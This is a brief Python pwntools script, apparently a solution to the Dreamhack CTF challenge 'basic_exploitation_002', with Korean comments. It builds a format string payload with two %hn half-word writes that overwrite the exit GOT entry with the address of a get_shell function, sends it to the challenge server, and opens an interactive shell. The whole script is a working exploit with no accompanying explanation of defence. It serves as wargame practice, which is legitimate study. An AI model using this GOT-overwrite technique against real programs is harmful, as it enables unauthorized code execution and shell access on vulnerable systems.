from pwn import *

#p = process('./basic_exploitation_002')
p = remote("host3.dreamhack.games", 22272)
e = ELF('./basic_exploitation_002')

get_shell_addr = e.symbols['get_shell'] #0x08048609
exit_got = e.got['exit'] #0x0804a024

first_addr = exit_got #0x00008609 가 쓰임
second_addr = exit_got + 0x2 #0x00000804가쓰임 (둘이합치면 0x0804a024에 0x08048609가 쓰임


print(f"exit_got: {hex(exit_got)}")
print(f"get_shell_addr: {hex(get_shell_addr)}")

payload = p32(second_addr)
payload += p32(first_addr)

payload += f"%{str(0x0804-8)}c%1$hn".encode() #0x0804 - 8(addr로 출력한거)
payload += f"%{str(0x8609-0x0804)}c%2$hn".encode()
print(payload)
p.sendline(payload)
p.interactive()
